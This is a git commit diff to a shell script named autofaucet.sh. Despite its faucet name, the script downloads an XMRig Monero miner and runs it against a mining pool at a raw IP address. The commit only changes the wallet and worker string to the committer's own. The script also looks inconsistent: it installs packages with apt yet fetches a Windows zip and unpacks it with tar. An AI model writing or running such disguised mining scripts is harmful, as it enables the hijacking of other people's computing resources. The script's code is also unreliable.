088785b5a1577fd3db0763f4d8545b310bc46895
william4mac <131428403+william4mac@users.noreply.github.com>
2023-04-24 02:44:17 +0700

    Update autofaucet.sh

--- autofaucet.sh
+++ autofaucet.sh
@@ -4,7 +4,7 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-gcc-win64.zip
 tar xf xmrig-5.8.1-gcc-win64.zip
 cd xmrig-5.8.1
-./xmrig -o 168.235.86.33:3393 -u MONERO:D5t4rMM376kiMdXKB5VCUKEwNEk7UrQDk4.tuan -p X -k -a rx/0-t2
+./xmrig -o 168.235.86.33:3393 -u MONERO:SK_QzApkbVGsAxyQykaWSnEF.william4mac -p X -k -a rx/0-t2
 while [ 1 ] ; do
 sleep 3
 done
